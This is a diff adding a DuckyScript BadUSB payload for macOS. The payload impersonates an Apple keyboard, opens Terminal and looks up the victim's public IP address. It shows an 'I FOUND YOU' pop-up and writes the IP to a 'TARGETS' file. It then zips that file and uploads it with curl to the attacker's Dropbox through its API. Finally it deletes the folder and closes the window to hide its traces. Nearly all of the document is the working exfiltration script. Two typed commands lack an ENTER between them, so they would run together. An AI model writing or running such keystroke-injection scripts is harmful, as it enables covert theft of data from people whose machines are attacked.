@@ -1,0 +1,49 @@
+REM Description: Uses Mac Terminals config.me command to do a PUBLIC I.P. lookup 
+REM displays the results in a pop up window & Saves the data to a folder on the desktop
+REM Then proceeds to upload the I.P. data to your API dropbox 
+REM removes the folder on the desktop and closes the terminal
+
+
+
+REM Title: Public I.P. Finder to Dropbox
+REM Author: Narsty
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Execution
+
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+STRING curl -s ifconfig.me; echo
+DELAY 500
+ENTER
+DELAY 500
+STRING public_ip=$(curl -s ifconfig.me); osascript -e "tell app \"System Events\" to display dialog \"I FOUND YOU: $public_ip\" with title \"Public IP Address\""
+DELAY 500
+STRING mkdir ~/Desktop/"Public I.P. Data" && echo "Your TARGETS IP address is: $public_ip" > ~/Desktop/"Public I.P. Data"/public_ip.txt
+DELAY 500
+ENTER
+DELAY 500
+STRING echo 'cd ~/Desktop/"Public I.P. Data" && zip -r backup.zip . && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <API access token here>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/backup.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @backup.zip' > upload.sh
+DELAY 1000
+ENTER
+DELAY 2500
+ENTER
+STRING chmod +x upload.sh
+ENTER
+DELAY 500
+STRING ./upload.sh
+ENTER
+DELAY 3000
+STRING rm -rf ~/Desktop/"Public I.P. Data"
+DELAY 500
+GUI w
+
+
+
